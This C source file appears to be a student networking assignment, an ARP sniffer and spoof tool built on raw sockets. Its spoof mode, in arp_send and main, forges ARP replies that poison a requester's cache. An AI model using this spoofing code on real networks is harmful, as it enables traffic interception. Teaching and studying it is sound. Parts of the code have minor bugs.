/*
	Name: main.c
	Author: I-Hsiang, Su Wang
	Date: 06/11/16 03:12
	Description: To learn how to receive, build and send Ethernet packets.
*/

#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include "arp.h"
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <stdbool.h>
#include <arpa/inet.h>

/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp2s0f5"

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

#define ETHER_HEADER_LEN sizeof(struct ether_header)
#define ETHER_ARP_LEN sizeof(struct ether_arp)
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
#define IP_ADDR_LEN 4
#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

int arp_recv(int sockfd_recv, int op_code, char *filter, struct arp_packet *recv_packet, bool spoofMode){
	int ret_len, i;	
	
	while (1)
	{		
		memset(recv_packet, 0, sizeof(ETHER_ARP_PACKET_LEN));
		/* receive ARP packets */
		ret_len = recvfrom(sockfd_recv, recv_packet, ETHER_ARP_PACKET_LEN, 0, NULL, NULL);
		if (ret_len > 0)
		{			
			if (ntohs(recv_packet->arp.arp_op) == op_code)
			{
				/* receive ARP request packets (op:0x0001) */
				if(op_code == ARPOP_REQUEST){	// ARPOP_REQUEST: 1  ARP request (linux/if_arp.h)
					char *target_IP;
					char *sender_IP;
					target_IP = get_target_protocol_addr(&recv_packet->arp);
					sender_IP = get_sender_protocol_addr(&recv_packet->arp);
					
					if(isIP(filter) && strcmp(filter, target_IP) != 0){
						continue;
					}					
					printf("Get ARP packe - Who has %15s?\tTell %s\n", target_IP, sender_IP);					
					free(target_IP);
					free(sender_IP);
					if(spoofMode){
						return sockfd_recv;
					}
				}
				/* receive ARP reply packets (op:0x0002) */
				else if(op_code == ARPOP_REPLY){	// ARPOP_REPLY: 2  ARP reply (linux/if_arp.h)
					char *sender_IP;
					char *sender_MAC;
					sender_IP = get_sender_protocol_addr(&recv_packet->arp);
					sender_MAC = get_sender_hardware_addr(&recv_packet->arp);
					
					if(isIP(filter) && strcmp(filter, sender_IP) != 0){
						continue;
					}
					printf("MAC address of %s is %s\n", sender_IP, sender_MAC);
					free(sender_IP);
					free(sender_MAC);
					break;
				}				
			}
		}
	}	
	close(sockfd_recv);
	free(recv_packet);
	return sockfd_recv;
}
void fill_ethe_header(struct arp_packet* send_packet, unsigned char *src_mac_addr, unsigned char *dst_mac_addr){
	/* fill ethernet header */
	memset(send_packet, 0, ETHER_ARP_PACKET_LEN);
	memcpy(send_packet->eth_hdr.ether_shost, src_mac_addr, ETH_ALEN);	// ETH_ALEN: 6 ctets in one ethernet addr (linux/if_ether.h)
	memcpy(send_packet->eth_hdr.ether_dhost, dst_mac_addr, ETH_ALEN);	
	send_packet->eth_hdr.ether_type = htons(ETHERTYPE_ARP);				// ETHERTYPE_ARP: x0806 (net/ethernet.h)
}
void fill_arp(struct arp_packet* send_packet, int op_code, unsigned char *src_mac_addr, unsigned char *dst_mac_addr, char *src_ip, char *dst_ip){
	/* fill arp */
	set_hard_type(&send_packet->arp, htons(ARPHRD_ETHER));				// ARPHRD_ETHER: 1  Ethernet 10/100Mbps (net/if_arp.h)
	set_prot_type(&send_packet->arp, htons(ETHERTYPE_IP));				// ETHERTYPE_IP: 0x0800 (net/ethernet.h)
	set_hard_size(&send_packet->arp, ETH_ALEN);
	set_prot_size(&send_packet->arp, IP_ADDR_LEN);
	set_op_code(&send_packet->arp, htons(op_code));	
	set_sender_hardware_addr(&send_packet->arp, src_mac_addr);
	set_sender_protocol_addr(&send_packet->arp, src_ip);
	set_target_hardware_addr(&send_packet->arp, dst_mac_addr);
	set_target_protocol_addr(&send_packet->arp, dst_ip);
}
struct arp_packet* fill_arp_packet(int op_code, unsigned char *src_mac_addr, unsigned char *dst_mac_addr, char *src_ip, char *dst_ip){
	struct arp_packet *send_packet;

	send_packet = (struct arp_packet*)malloc(ETHER_ARP_PACKET_LEN);
	
	/* fill ethernet header */
	fill_ethe_header(send_packet, src_mac_addr, dst_mac_addr);
	
	/* fill arp */
	fill_arp(send_packet, op_code, src_mac_addr, dst_mac_addr, src_ip, dst_ip);	

	return send_packet;
}

void get_INDEX(int sockfd_send, struct ifreq *req){
	/* get interface card index */
	if(ioctl(sockfd_send, SIOCGIFINDEX, req) == -1){
		perror("ioctl() get ifindex\n");
		exit(1);
	}
}
char* get_ADDR(int sockfd_send, struct ifreq *req){
	/* get interface card IP */	
	if(ioctl(sockfd_send, SIOCGIFADDR, req) == -1){
		perror("ioctl() get ip\n");
		exit(1);
	}
	return inet_ntoa(((struct sockaddr_in*)&(req->ifr_addr))->sin_addr);
}
void get_HWADDR(int sockfd_send, struct ifreq *req){
	/* get interface card MAC */
	if (ioctl(sockfd_send, SIOCGIFHWADDR, req)){
		perror("ioctl() get mac\n");
		exit(1);
	}
}

int arp_send(int sockfd_send, int op_code, char *dst_ip, struct arp_packet *send_packet){	
	
	struct sockaddr_ll sa;
	struct ifreq req;
	struct in_addr myip;
	unsigned char src_mac_addr[ETH_ALEN];
	unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
	char *src_ip;
	int ret_len, i;
	
	memset(&sa, 0, sizeof(struct sockaddr_ll));
	memset(&req, 0, sizeof(struct ifreq));

	/* interface card name */
	memcpy(req.ifr_name, DEVICE_NAME, strlen(DEVICE_NAME));

	/* get interface card index */
	get_INDEX(sockfd_send, &req);
	sa.sll_ifindex = req.ifr_ifindex;
	sa.sll_family = PF_PACKET;

	/* get interface card IP */	
	src_ip = get_ADDR(sockfd_send, &req);	

	/* get interface card MAC */
	get_HWADDR(sockfd_send, &req);	
	memcpy(src_mac_addr, req.ifr_hwaddr.sa_data, ETH_ALEN);
	
	/* fill ARP packet */
	if(op_code == ARPOP_REQUEST){		
		send_packet = fill_arp_packet(op_code, src_mac_addr, dst_mac_addr, src_ip, dst_ip);
	}
	else if(op_code == ARPOP_REPLY){	
		unsigned int target_MAC[ETH_ALEN];
		unsigned int sender_MAC[ETH_ALEN];

		sscanf(get_sender_hardware_addr(&send_packet->arp), "%02x:%02x:%02x:%02x:%02x:%02x", &target_MAC[0], &target_MAC[1], &target_MAC[2], &target_MAC[3], &target_MAC[4], &target_MAC[5]);
		sscanf(dst_ip, "%02x:%02x:%02x:%02x:%02x:%02x", &sender_MAC[0], &sender_MAC[1], &sender_MAC[2], &sender_MAC[3], &sender_MAC[4], &sender_MAC[5]);
		
		unsigned char ctarget_MAC[ETH_ALEN];
		unsigned char csender_MAC[ETH_ALEN];
		char *ctarget_IP;
		char *csender_IP;
		int i;
		for(i = 0; i < ETH_ALEN; i++){
			ctarget_MAC[i] = target_MAC[i];
			csender_MAC[i] = sender_MAC[i];
		}
		csender_IP = get_target_protocol_addr(&send_packet->arp);
		ctarget_IP = get_sender_protocol_addr(&send_packet->arp);
		
		/* fill ethernet header */
		fill_ethe_header(send_packet, src_mac_addr, ctarget_MAC);
		
		/* fill arp */
		fill_arp(send_packet, op_code, csender_MAC, ctarget_MAC, csender_IP, ctarget_IP);
		printf("Sent ARP reply: %s is %s\n", csender_IP, dst_ip);
		free(ctarget_IP);
		free(csender_IP);
	}

	/* send ARP request packet */
	ret_len = sendto(sockfd_send, send_packet, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&sa, sizeof(struct sockaddr_ll));
	if ( ret_len > 0 && op_code == ARPOP_REPLY){
		printf("Send successful\n");
	}
	if ( ret_len <= 0){
		perror("sendto() error\n");
		exit(1);
	}

	close(sockfd_send);
	free(send_packet);
	return sockfd_send;
}
int main(int argc, char *argv[])
{
	int sockfd_recv = 0, sockfd_send = 0;
	struct arp_packet *recv_packet;
	struct arp_packet *send_packet;
	struct sockaddr_ll sa;
	struct ifreq req;
	struct in_addr myip;	

	/* check superuser */
	if(geteuid() != 0){
		perror("ERROR: You must be root to use this tool!\n");
		exit(1);
	}
	
	/* check argument count */
	if(argc < 3 || argc > 3){
		print_usage();
		exit(1);
	}

	/* Open a recv socket in data-link layer. */
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error");
		exit(1);
	}
	recv_packet = (struct arp_packet*)malloc(ETHER_ARP_PACKET_LEN);
	
	/* Open a send socket in data-link layer. */
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}
	
	printf("[ ARP sniffer and spoof program ]\n");
	
	/* receive an ARP packet */
	if(strcmp(argv[1], "-l") == 0){
		if(strcmp(argv[2], "-a") == 0 || isIP(argv[2])){
			printf("### ARP sniffer mode ###\n");
			sockfd_recv = arp_recv(sockfd_recv, ARPOP_REQUEST, argv[2], recv_packet, false);		
		}
	}	
	/* send an ARP request packet */
	else if(strcmp(argv[1], "-q") == 0 && isIP(argv[2])){
		printf("### ARP query mode ###\n");
		sockfd_send = arp_send(sockfd_send, ARPOP_REQUEST, argv[2], send_packet);
		sockfd_recv = arp_recv(sockfd_recv, ARPOP_REPLY, argv[2], recv_packet, false);
	}	
	/* receive a specific ARP packet, and send a fake ARP reply packet */
	else if(isMAC(argv[1]) && isIP(argv[2])){
		printf("### ARP spoof mode ###\n");
		sockfd_recv = arp_recv(sockfd_recv, ARPOP_REQUEST, argv[2], recv_packet, true);
		sockfd_send = arp_send(sockfd_send, ARPOP_REPLY, argv[1], recv_packet);
	}
	else{
		print_usage();
		exit(1);
	}
	
	close(sockfd_send);
	close(sockfd_recv);
	return 0;
}

